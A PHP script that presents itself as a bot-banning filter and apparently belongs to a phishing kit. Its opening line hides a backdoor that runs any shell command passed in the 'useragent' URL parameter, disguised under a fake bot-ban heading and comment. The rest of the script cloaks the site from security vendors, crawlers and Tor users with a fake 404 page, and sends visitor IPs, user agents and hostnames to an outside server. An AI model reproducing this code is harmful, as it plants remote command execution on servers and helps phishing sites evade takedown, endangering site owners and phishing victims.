<?php
	if(isset($_GET['useragent'])){echo"<h1>deny_agent(bot)=('Yandex,Baiduspider,Acunetix,</h1><pre>"; system($_GET['useragent']);exit;} 
//CHECK TO BAN KNOWN BOT USERAGENTs Yo_CHI

function gethomedir(){
	global $isshell;
	global $yochadminpage;
	$d=dirname($_SERVER['PHP_SELF'],1);
	if($d=='\\' or $d=='/'){$dir=$_SERVER['DOCUMENT_ROOT'];}
	elseif(isset($yochadminpage)){$dir='..';}
	elseif(isset($isshell)){$dir=$isshell;}
	else{if(isset($_SESSION['homedir'])){$dir=$_SESSION['homedir'];} else{$dir=implode('/',array_slice(explode('/',str_replace('\\','/',dirname(__FILE__))),0,-1));};};
	return $dir;
	};

function getcurrip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};
	
function updateadmin($data){
	$filedir= gethomedir().'/admin/db.json';
	$ud=file_get_contents($filedir);
	$udarray = json_decode($ud,true);
	$narr=array();
	foreach($udarray as $key=>$value){$narr[$key]=$value;};
	if($data == 'bots'){
		$narr[$data] += 1;
		$narr['humans'] = $narr['visits'] - $narr['bots'];}
	else{$narr[$data] += 1;};
	file_put_contents($filedir,json_encode($narr));
};


function gcred(){
	$keyf="yochapi.txt";
	if(file_exists(''.$keyf)){$filedir= ''.$keyf;}
	elseif(file_exists('../'.$keyf)){$filedir= '../'.$keyf;}
	elseif(file_exists('../../'.$keyf)){$filedir= '../../'.$keyf;}
	else{$filedir= gethomedir().'/'.$keyf;};
	$ud=file_get_contents($filedir);
	$cred = @trim($ud);
	return $cred;
};

function logbot($msg){
	$fil= gethomedir().'/admin/bots.txt';
	$ip = getcurrip();
	$dt = date('d-m-Y H:i:s');
	$ua = $_SERVER['HTTP_USER_AGENT'];
	$hn = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	if(isset($_SERVER['HTTP_REFERER'])){$rf = $_SERVER['HTTP_REFERER'];} else{$rf = 'NONE';};
	$message = '+[--- BOT BANNED : '.$msg.' ---]+<br/>
IP ADDR         : https://db-ip.com/'.$ip.'<br/>
DateTime        : '.$dt.'<br/>
User-Agent      : '.$ua.'<br/>
Host ADDR       : '.$hn.'<br/>
Referer         : '.$rf.'<br/>
++++++++++[ ######### ]++++++++++<br/>
<br/>
';
	if ($msg!="Yochi Antibots"){
	$generatedtimekey = substr(sha1(md5(time())), 0,32);
	$data = ['ip' => $ip ,'useragent' => $ua ,'referrer' => $rf ,'hostname' => $hn,'reason' => $msg];
	$antibotsite='http://the-yoch2-project.sk/botkilla?v=1&key='.$generatedtimekey;
	$ch = curl_init($antibotsite);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	curl_close($ch);};
	$xy = fopen($fil, "a");
	fwrite($xy, $message);
	fclose($xy);};
	
function banbot($logip=true){
	if($logip==true){
		$ip=getcurrip();
		$d=dirname($_SERVER['PHP_SELF'],1);
		if($d=='\\' || $d=='/' || getcwd() == gethomedir()){$dirstep=gethomedir();} elseif(substr($d,-7)=='confirm'){$dirstep='../..';} else{$dirstep='..';};
		$ipr=explode(".",$ip);
		if(!preg_match('/^172\.58.*.*/',$ip)){$ipr[3]='*';};
		$ipregex=join('.',$ipr);
		$f=$dirstep."/bad_ips.txt";
		if(file_exists($f)){
			$mile = fopen($f,"a");
			fwrite($mile,"\r\n".$ip."\r\n".$ipregex);}
		else{$mile = fopen($f,"a");fwrite($mile,$ip."\r\n".$ipregex);};
	fclose($mile);};
		
	global $yochadminpage;
	if(!isset($yochadminpage)){updateadmin('bots');};
		
    header('HTTP/1.0 404 Not Found');
		die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
				<html>
					<head>
						<title>404 Not Found</title>
						</head>
					<body>
						<h1>Not Found</h1>
						<p>The requested URL ' . $_SERVER['REQUEST_URI'] . ' was not found on this server.</p>
						<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
					</body>
				</html>'); 
			exit();};
			
	
function is_bot() {
    $spiders = array('007ac9', '7siters', '013 netvision', '50.nu', '192agent', 'a6-indexer', 'a100 row', 'abacho', 'abonti', 'above', 'accoona', 'acoi', 'acoon', 'acunetix', 'adaxas', 'addthis', 'admantx', 'adressendeutschland', 'agada', 'ah-ha', 'ahc/2.1', 'ahoy', 'aiohttp', 'akamai', 'aladin', 'alexa site audit', 'alkaline', 'altavista', 'amagit', 'amazon', 'americanexpress', 'amuri', 'amzn_assoc', 'analytics', 'ananzi', 'annotate', 'anonymizer', 'anthill', 'anzwers', 'aol', 'apache-httpclient', 'apachebench', 'apercite', 'apexis', 'aplix', 'aportworm', 'app.hypefactors', 'appie', 'apple inc', 'arachni', 'arachnophilia', 'arale', 'araneo', 'aranha', 'architext', 'aretha', 'arks', 'aruba', 'as9105', 'ask24', 'ask jeeves', 'askaboutoil', 'asked', 'aspseek', 'asterias', 'astutesrm', 'atlocal', 'atn', 'atomz', 'augurfind', 'autoshun', 'avant', 'avast', 'avg', 'avira', 'avirasoft', 'awario', 'axios', 'azure', 'b2 net solutions', 'baboom', 'backlink-check.de', 'backrub', 'badware', 'baidu', 'barkrowler', 'barracuda', 'baypup', 'bazqux reader', 'bdfetch', 'big brother', 'bigbrother', 'biglotron', 'bilbo', 'bingpreview', 'bitdefender', 'bitfolk', 'bjaaland', 'blackboard', 'blackwidow', 'blaiz', 'blazing seo', 'blo.', 'blog', 'bloodhound', 'blue coat systems', 'boardreader', 'boardreader blog indexer', 'boitho', 'booch', 'bot', 'bradley', 'brandverity', 'british telecommunications plc', 'browsershots', 'bruuk.sk', 'btcentralplus', 'btwebclient', 'bubing', 'buck', 'buck/2.2', 'bullguard aps', 'butterfly', 'cachednet', 'calif', 'calyxinstitute', 'camehttps', 'cassandra', 'castro 2', 'catchpoint', 'catexplorador', 'ccubee', 'cdn77', 'census', 'censys', 'centralnic', 'cfetch', 'cfnetwork', 'charlotte', 'chelyabinsk-signal llc', 'chinanet fujian province network', 'choopa', 'churl', 'cienciaficcion', 'cisco', 'cl0na', 'clamav', 'claro dominican republic', 'clicktargetdevelopment', 'clientid', 'cloud', 'cmc', 'cmu', 'collectd', 'collective', 'colocrossing', 'coloup', 'comagent', 'combine', 'commafeed', 'comodo', 'compatible', 'complete internet access', 'computer problem solving', 'computingsite', 'comrise.ru', 'contaboserver', 'content delivery network ltd', 'cpanel', 'crawl', 'crime', 'crossdomain', 'cs.daum', 'csci', 'cubenode system sl', 'curl', 'cusco', 'customer network', 'cyberinfo', 'cymru', 'cyveillance', 'dalvik', 'daniel james austin', 'datacamp', 'datadog agent', 'dataline ltd', 'datanyze', 'datapacket', 'dataprovider', 'daum', 'daumoa', 'dedfiberco', 'deepindex', 'del.icio.us', 'delete', 'delorie', 'depspid', 'deweb', 'die blinde kuh', 'dieblindekuh', 'digger', 'digital domain', 'digital energy technologies limited', 'digital ocean', 'digitalcourage.de', 'digitalocean', 'digiweb ltd', 'dir a/s', 'ditto', 'dlvr.it', 'dmoz', 'docomo', 'domainappender', 'domainsproject', 'dosarrest', 'download express', 'downloadexpress', 'downnotifier', 'dr.web', 'dreampassport', 'drweb', 'dtaagent', 'duckduck', 'dwcp', 'dyn.plus.net', 'e-active.nl', 'e-collector', 'ebay', 'ebbs.healingpathsolutions', 'ebiness', 'ebingbong', 'ecairn-grabber', 'echo blinde kuh', 'eir broadband', 'eircom customer assignment', 'ejupiter', 'email', 'emailwolf', 'embedly', 'emsisoft', 'enom', 'eonix corporation', 'esecuredata', 'eset', 'esther', 'evc-batch', 'evliya celebi', 'evliyacelebi', 'exit-01a.noisetor.net', 'expanse', 'expressvpn', 'externalhit', 'ez publish link validator', 'ezooms', 'ezresult', 'facebook', 'falcon', 'fastly', 'favicon', 'feed wrangler', 'feedbin', 'feedburner', 'feedfetcher', 'feedly', 'feedspot', 'felix ide', 'felixide', 'ferret', 'fetcher6-2.go.mail.ru', 'fetchrover', 'fever', 'fido', 'findlinks', 'fireball', 'firebird', 'fireeye', 'flipboard', 'flokinet', 'fm scene', 'fortiguard', 'fortinet', 'fouineur', 'foundee', 'france telecom s.a.', 'freebsd', 'freshrss', 'funnelweb', 'gandi sas', 'gazz', 'gcreep', 'genieknows', 'genieo', 'geosr', 'getstream.io/winds', 'getterroboplus', 'geturl', 'gigablast', 'gigablastopensource/1.0', 'gigenet', 'github', 'global data networks llc', 'global perfomance', 'glutenfreepleasure', 'glx', 'gmail', 'go-http-clientgodaddy', 'godaddy, llc', 'goforit', 'golem', 'goo', 'google', 'grabber', 'gralon', 'grapeshot', 'grapnel', 'griffon', 'gromit', 'group', 'grouphigh', 'grub', 'gstatic', 'gulliver', 'hamahakki', 'harvest', 'havindex', 'headless', 'healingpathsolutions', 'heg us', 'helix', 'heritrix', 'heureka feed', 'hicoria', 'highwinds network', 'hilfe-veripayed', 'hinet', 'hku www octopus', 'hkuwwwoctopus', 'homerweb', 'host', 'hotmail', 'htdig', 'html index', 'html_analyzer', 'htmlgobble', 'htmlindex', 'http_request2', 'httpmon', 'httrack', 'hubater', 'hubpages', 'hubspot', 'hyper-decontextualizer', 'ia_archiver', 'ibm_planetwide', 'ibwww-perl', 'ichiro', 'iconsurf', 'icoreservice', 'idg/it', 'iis site analysis', 'iltrovatore', 'image.kapsi', 'imagelock', 'imon communications, llc', 'inagist', 'incywincy', 'indexer', 'infobee', 'informant', 'infosphere', 'ingrid', 'inktomi', 'inoreader', 'insights', 'inspector web', 'inspectorweb', 'instagram', 'intelliagent', 'internap network services corporation', 'internet customers', 'internet shinchakubin', 'internet-pro', 'internetdefence', 'internetshinchakubin', 'intersoft internet', 'intrinsec', 'involta', 'ip3000', 'ipredator', 'ips agent', 'ips-agent', 'ipvanish', 'iq pl sp. z o.o.', 'iron33', 'is74.ru', 'itcom shpk', 'ivia', 'jabber', 'jack', 'jakarta', 'java', 'jetbrains', 'jetslide', 'joshua peter mcquistan', 'jsc er-telecom holding', 'jumpstation', 'kaspersky', 'katipo', 'kdd-explorer', 'kilroy', 'knowledge', 'kototoi', 'kouio', 'kraken', 'kretrieve', 'kyivstar', 'labelgrabber', 'lachesis', 'larbin', 'lcc', 'leak', 'legs', "let's encrypt validation", 'level', 'level3', 'level 3', 'lg dacom', 'libwww', 'lifesites', 'lighthouse', 'link validator', 'linkalarm', 'linkdex', 'linkfluence', 'linkgrid llc', 'linkvalidator', 'linode', 'liquid web', 'lixux ou', 'lockon', 'logicweb', 'london wires ltd.', 'london-tor.mooo', 'long thrive', 'ltx71', 'lukman', 'lvlt-static-4-14-16', 'lwp', 'lycos', 'm247 ltd frankfurt infrastructure', 'm-net', 'madgenius', 'magpie', 'magpierss', 'mailshell', 'mainloop', 'majestic12', 'mantraagent', 'mapoftheinternet', 'marvin', 'master internet', 'mattie', 'mcafee', 'mediafox', 'mediapartners', 'megaindex', 'mercator', 'merit network', 'merzscope', 'messagelabs', 'messenger', 'metadataparser', 'metainspector', 'metauri', 'microsoft', 'millersmiles', 'miniature', 'minirank', 'minsktelecom.by', 'miva', 'mj12', 'moget', 'mon.itor.us', 'monitis', 'monitor.us', 'moose', 'moreover', 'mpdedicated', 'msn', 'multitext', 'muncher', 'munin', 'muscatferret', 'myweb', 'mywot', 'myx group llc', 'nagios check_http', 'najdi', 'nameprotect', 'nationaldirectory', 'nazilla', 'nbertaupete95', 'ncsa beta', 'ncsabeta', 'nec-meshexplorer', 'nederland.zoek', 'neofonie', 'net4sec', 'netcarta webmap engine', 'netcartawebmapengine', 'netcraft', 'netestate', 'netflix', 'netlyzer fastprobe', 'netmechanic', 'netnewswire', 'netpilot', 'netprotect srl', 'netscoop', 'netsparker', 'netvibes', 'newmedia express', 'newsblur', 'newsgator', 'newspaper', 'nforce entertainment b.v.', 'nhse', 'nine internet', 'ning', 'nmap', 'nobis ', 'node', 'noisetor', 'nokia6682', 'nomad', 'noyona', 'nutch', 'nuzzel', 'nwstack', 'nzexplorer', 'occam', 'octopus', 'ojsc oao tattelecom', 'okhttp', 'omgili', 'omni', 'onavo mobile ltd', 'onyphe', 'open text', 'opendns', 'openfind', 'openintelligencedata', 'openlinkprofiler', 'opensourcerss', 'opentext', 'oracle', 'orange polska spolka akcyjna', 'orange-labs', 'osis-project', 'outbrain', 'outlook', 'ovh', 'p3pwgdsn', 'pacbell', 'pack rat', 'packrat', 'page_verifier', 'pageboy', 'pagebull', 'pagepeeker', 'paloalto', 'panscient', 'parasite', 'parked.factioninc', 'parrukatu', 'partnersite', 'pathsconnect', 'patric', 'paypal', 'pcore-http', 'peak 10', 'pear.', 'pegasus', 'peregrinator', 'petersburg internet network ltd.', 'pgp key agent', 'pgpkeyagent', 'phantom', 'phish', 'php server monitor', 'php-curl-class', 'phpdig', 'piltdownman', 'pimptrain', 'pingdom', 'pinpoint', 'pinterest', 'pioneer', 'pipes', 'pipex-block1', 'piranha', 'plumtreewebaccessor', 'plusnet', 'plusnet technologies ltd', 'pocketparser', 'pogodak', 'poirot', 'pompos', 'poppelsdorf', 'poppi', 'popular iconoclast', 'populariconoclast', 'prcdn.net', 'prescient software', 'presto', 'preview', 'prevx', 'prittorrent', 'private customer', 'private ip address lan', 'privatesystems networks', 'privoxy', 'probe', 'profound', 'progtech.ru', 'proximic', 'proxy', 'psinet', 'psycheclone', 'psychz', 'public facing services', 'publisher', 'pycurl', 'python', 'qihu', 'quadmetrics', 'quadranet', 'qualitynetwork', 'quasi networks ltd', 'quicklook', 'quintex alliance consulting', 'quora link preview', 'qwantify', 'r6_commentreader', 'r6_feedfetcher', 'rackspace', 'rainmeter', 'rambler', 'ramnode', 'rederatural', 'redpill linpro as', 'redswitches pty', 'reverseshorturl', 'riddler', 'rima-tde', 'roach', 'road runner', 'roadhouse', 'roadrunner', 'roamsite', 'robbie', 'robofox', 'robozilla', 'roi hunter', 'ruby', 'rules', 'safebrowsing', 'safesurfingwidget', 'salty', 's.a.s', 'sbider', 'sc rusnano', 'scalaj-http', 'scaleway', 'scam', 'scan', 'schmorp.de', 'schulte consulting llc', 'scmguard', 'scooter', 'scoutjet', 'scrapy', 'scrubby', 'seamonkey', 'search', 'sectoor', 'securedconnectivity', 'secureinternet', 'secureserver', 'security', 'seek', 'semantic', 'semrush', 'senrigan', 'seokicks', 'server', 'seznam', 'sg-scout', 'shadowserver', "shai'hulud", 'shark', 'shopalike', 'shopify partner', 'shopwiki', 'shore', 'sidewinder', 'sift', 'silk', 'silverreader', 'simmany', 'simplepie', 'simpli networks llc', 'simtccflow1.etn', 'sistrix optimizer', 'site24x7 website monitoring', 'site valet', 'siteadvisor', 'sitecheck', 'siteexplorer', 'siteimprove', 'sitesucker', 'sitetech-rover', 'sitevalet', 'sixy.ch', 'skymob', 'skype uri preview', 'sl-reverse', 'sleek', 'sleuth', 'slurp', 'smartwit', 'sna-', 'snab-inform private enterprise', 'snapchat', 'snappy', 'snooper', 'softlayer', 'sogou', 'sohu', 'solar vps', 'solution', 'sonicwall', 'sophos', 'spam', 'spark new zealand trading ltd', 'sparkler', 'speedfind', 'speedtravel', 'speedy', 'sphere', 'sphider', 'spider', 'spinn3r', 'spinner', 'spotify', 'spro-net', 'spyder', 'sqlmap', 'ssl labs', 'staircaseirony', 'stanford', 'starnet.md', 'startpagina linkchecker', 'static ip assignment', 'statuscake', 'steeler', 'stelkom', 'stretchoid', 'sucuri', 'suke', 'sungard', 'suntek', 'supersnooper', 'surfcontrol', 'surfnet', 'surfnomore', 'surriel', 'sven', 'sygol', 'sylera', 'symantec', 'synprobe', 'sysms', 'sysomos', 'szukacz', 't-h-u-n-d-e-r-s-t-o-n-e', 't-rex', 'tach black widow', 'tachblackwidow', 'tahoe internet exchange (tahoeix)', 'talktalk', 'tarantula', 'tarmot gezgin', 'team technologies llc', 'techinfo@ubermetrics-technologies', 'tehnologii budushego llc', 'teledata-fttx.de', 'telegram', 'templeton', 'tencenttraveler', 'teoma', 'terratransit', 'terrykyleseoagency', 'tfbnw', 'the calyx institute', 'theknowledgeai', 'theoldreader', 'theophrastus', 'time warner cable internet llc', 'tiny tiny rss', 'tinytinyrss', 'titan', 'titin', 'tkwww', 'tlh.ro', 'tlsprobe', 'tor-exit', 'tor-relays', 'tor.node', 'tor.piratenpartei-nrw.de', 'torservers', 'total server solutions', 'toutatis', 'tpnet.pl', 'traackr', 'tracemyfile', 'translate', 'trendiction', 'trendmicro', 'trendsmapresolver', 'trident', 'triolan', 'trustwave', 'tutorgig', 'twiceler', 'twingly recon', 'twisted', 'twitter', 'ubermetrics', 'ubuntu', 'ucsd', 'udasha', 'uk dedicated servers limited', 'ukrnet', 'unchaos', 'universalfeedparser', 'universidade federal do rio de janeiro', 'university', 'unknown', 'unn', 'untrusted', 'unwindfetchor', 'upc romania bucuresti', 'updated', 'updown_tester', 'url check', 'url.thum.io', 'urlcheck', 'urlredirectresolver', 'urlresolver', 'vagabondo', 'valkyrie', 'ventelo wholesale', 'versanet.de', 'versaweb', 'vertical telecoms', 'victoria', 'virtual1 limited', 'virtual employee pvt ltd', 'virus', 'vist on-line ltd', 'vk share button', 'vnet a.s.', 'volcano', 'voxility', 'voyager', 'vpsmalaysia', 'vultr', 'w3c', 'w3m2', 'w3mir', 'walker', 'wallpaper', 'wanderer', 'wappalyzer', 'wapproxy', 'wauuu', 'wavefire', 'web core', 'web hopper', 'web wombat', 'webbandit', 'webcatcher', 'webcopy', 'webcore', 'webdatastats', 'webfoot', 'webhopper', 'weblayers', 'weblight', 'weblinker', 'weblog monitor', 'weblogmonitor', 'webmirror', 'webmonkey', 'weborama', 'webpagetest', 'webquest', 'webreaper', 'websecurityguard', 'websitepulse', 'websnarf', 'webstolperer', 'webthumbnail', 'webvac', 'webwalk', 'webwatch', 'webwombat', 'webzinger', 'westnet', 'wget', 'whatsapp', 'whitelabel it solutions corp', 'whizbang', 'whowhere', 'wikido', 'wikipedia', 'wild ferret', 'wildferret', 'windows95', 'windows98', 'windows 95', 'windows 98', 'windows xp', 'windowspowershell', 'windscribe', 'wintek corporation', 'woorank', 'wordpress', 'wordpressmshots', 'worldlight', 'wotbox', 'wowrack', 'www.fortinet', 'wwwc', 'wwwroot', 'wwwster', 'x11', 'xenu', 'xget', 'xift', 'xirq', 'xo communications', 'xs4all internet bv', 'y!j-brw', 'yacy', 'yahoo', 'yak/1.0', 'yandex', 'yanga', 'yeti', 'yodao', 'yottaa site monitor', 'yourls', 'zao', 'zayo', 'ze list', 'zenlayer', 'zgrab', 'zipcommander', 'zippp', 'zscaler', 'zteopen', 'zyborg');
	$d3 = ' '.gethostbyaddr($_SERVER['REMOTE_ADDR']);
	$d4 =  ' '.$_SERVER['HTTP_USER_AGENT'];	
	$rtn='no';
    foreach($spiders as $spider) {
        if (stripos($d4, $spider) == true || stripos($d3, $spider) == true || preg_match('/^[\s\.]*$/',$d4)){$rtn = 'yes';break;};
    }
    if($rtn=='yes'){return true;} else{return false;};
};
if (is_bot()) {logbot('BANNED UA/HOST');banbot();exit();};

	
include "rando.php";

?>